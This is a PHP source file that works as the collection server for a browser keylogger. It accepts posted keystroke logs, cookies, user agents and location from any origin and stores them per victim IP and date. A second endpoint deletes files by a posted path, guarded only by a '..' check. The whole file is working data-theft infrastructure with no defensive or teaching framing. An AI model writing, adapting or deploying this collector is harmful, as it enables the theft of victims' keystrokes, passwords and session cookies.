<?php

header("Access-Control-Allow-Origin: *");

// If new logs
if (isset($_POST["sendLogs"])) {
	// Info
	$name      = $_POST["name"];
	$host      = $_POST["host"];
	$curDate   = date("d-m-Y");
	$curTime   = $_POST["time"];
	$keyLogs   = $_POST["keyLogs"];
	$cookies   = $_POST["cookies"];
	$uagents   = $_POST["uagents"];
	$location  = $_POST["location"];
	$remoteIP  = $_SERVER["REMOTE_ADDR"];

	$directory = "logs/" . $remoteIP . "/" . $curDate;
	$logfile   = $directory . "/" . $curTime . ".log";
	// Create logs dir if it not exists
	if (!file_exists($directory)) {
		mkdir($directory, 0777, true);
	}
	// Data
	$data = [
	    "remote_ip" => $remoteIP,
	    "location"  => $location,
	    "uagents"   => $uagents,
	    "cookies"   => $cookies,
	    "name"      => $name,
	    "host"      => $host,
	    "date"      => $curDate,
	    "time"      => $curTime,
	    "keyLogs"   => str_replace("\n", "\\n", $keyLogs)
	];
	$data = json_encode($data, JSON_PRETTY_PRINT);
	// Save data
	$file = fopen($logfile, "w");
	fwrite($file, $data);
	fclose($file);
	die("Data saved!");
}
// Delete file
elseif (isset($_POST["cleanLogs"])) {
	$file = $_POST["logfile"];
	// Check
	if (strpos($file, '..') !== false) {
		die("Permission denied >> ../");
	}
	// Remove
	if (unlink($file)) {
		die("Logs removed!");
	} else {
		die("Logs not removed!");
	}
	
}


?>